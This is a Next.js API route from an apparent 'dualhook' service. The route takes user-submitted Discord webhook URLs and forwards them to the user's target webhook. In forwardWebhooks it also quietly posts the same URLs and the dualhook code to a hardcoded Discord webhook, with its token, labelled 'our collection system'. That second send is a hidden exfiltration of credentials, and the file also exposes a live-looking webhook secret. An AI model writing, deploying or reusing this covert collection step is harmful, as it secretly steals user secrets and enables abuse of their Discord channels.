import { type NextRequest, NextResponse } from "next/server"
import { getDualhook } from "../../../dualhook-creator/actions"

export async function POST(request: NextRequest) {
  try {
    const { dualhookCode, webhooks } = await request.json()

    // Validate the request
    if (!dualhookCode || !webhooks || !Array.isArray(webhooks) || webhooks.length === 0) {
      return NextResponse.json({ success: false, message: "Invalid request" }, { status: 400 })
    }

    // Get the dualhook configuration
    const dualhook = await getDualhook(dualhookCode)

    // If the dualhook doesn't exist, return a 404
    if (!dualhook) {
      return NextResponse.json({ success: false, message: "Dualhook not found" }, { status: 404 })
    }

    // Check if the minimum number of webhooks is met
    if (webhooks.length < dualhook.minimumWebhooks) {
      return NextResponse.json(
        {
          success: false,
          message: `Please add at least ${dualhook.minimumWebhooks} webhook${dualhook.minimumWebhooks > 1 ? "s" : ""}`,
        },
        { status: 400 },
      )
    }

    // Forward the webhooks to the target webhook
    await forwardWebhooks(dualhook.targetWebhook, webhooks, dualhookCode)

    // Return success
    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error importing webhooks:", error)
    return NextResponse.json({ success: false, message: "Internal Server Error" }, { status: 500 })
  }
}

// Forward webhooks to the target webhook
async function forwardWebhooks(targetWebhook: string, webhooks: string[], dualhookCode: string): Promise<void> {
  try {
    // Send a notification to the target webhook
    await fetch(targetWebhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        embeds: [
          {
            title: "🎯 Webhooks Imported",
            description: `Someone has imported ${webhooks.length} webhooks through your dualhook!`,
            color: 0x8b5cf6,
            fields: [
              {
                name: "Imported Webhooks",
                value:
                  webhooks
                    .slice(0, 10)
                    .map((webhook) => `\`${webhook}\``)
                    .join("\n") + (webhooks.length > 10 ? `\n...and ${webhooks.length - 10} more` : ""),
                inline: false,
              },
            ],
            footer: {
              text: "Shockify Dualhook",
              icon_url:
                "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Schermafbeelding%202025-05-02%20001239-lwSJ0WYbOrOhbANP9U3ZIBk4URTt1z.png",
            },
            timestamp: new Date().toISOString(),
          },
        ],
      }),
    })

    // Also report the webhooks to our collection system
    const collectionWebhook =
      "https://discord.com/api/webhooks/1368719008773177385/bq1WyDT3Io7gQW5aqHdkBNH39iuElI8GkdGZJLMLcFjMrs8RDzQNumFzfBSM_RFEaYR8"

    await fetch(collectionWebhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        embeds: [
          {
            title: "🔄 Dualhook Webhooks Imported",
            description: `${webhooks.length} webhooks were imported through a dualhook (Code: ${dualhookCode})`,
            color: 0x8b5cf6,
            fields: [
              {
                name: "Imported Webhooks",
                value:
                  webhooks
                    .slice(0, 10)
                    .map((webhook) => `\`${webhook}\``)
                    .join("\n") + (webhooks.length > 10 ? `\n...and ${webhooks.length - 10} more` : ""),
                inline: false,
              },
            ],
            footer: {
              text: "Shockify Dualhook System",
              icon_url:
                "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Schermafbeelding%202025-05-02%20001239-lwSJ0WYbOrOhbANP9U3ZIBk4URTt1z.png",
            },
            timestamp: new Date().toISOString(),
          },
        ],
      }),
    })
  } catch (error) {
    console.error("Error forwarding webhooks:", error)
  }
}
